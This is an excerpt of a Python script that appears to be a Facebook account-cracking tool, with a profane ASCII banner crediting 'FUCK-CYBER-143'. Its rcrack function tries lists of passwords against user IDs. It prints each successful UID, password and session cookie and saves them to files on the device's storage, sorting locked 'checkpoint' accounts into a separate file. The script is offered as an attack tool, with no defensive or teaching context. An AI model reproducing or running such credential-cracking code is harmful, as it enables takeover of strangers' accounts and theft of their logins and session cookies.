...
logo =("""\033[1;32m
. .d8b.  d8888b. d888888b d8888b. 
d8' `8b 88  `8D   `88'   88  `8D 
88ooo88 88   88    88    88oooY' 
88~~~88 88   88    88    88~~~b. 
88   88 88  .8D   .88.   88   8D 
YP   YP Y8888D' Y888888P Y8888P' 
                                 
                                
                                                                                                                                    
       ┌━━━━━━━━━━━━━━━━━ FUCK ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SADMAN FUCK SNIGDHO            
               \033[1;91mFACEBOK      :  SNIGDHO AFRIDI              
               \033[1;97mGITHUB       :  FUCK-CYBER-143       
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO FUCK-CYBER-143 TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[FUCK\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[FUCK-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/FUCK-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[FUCK-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/FUCK-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
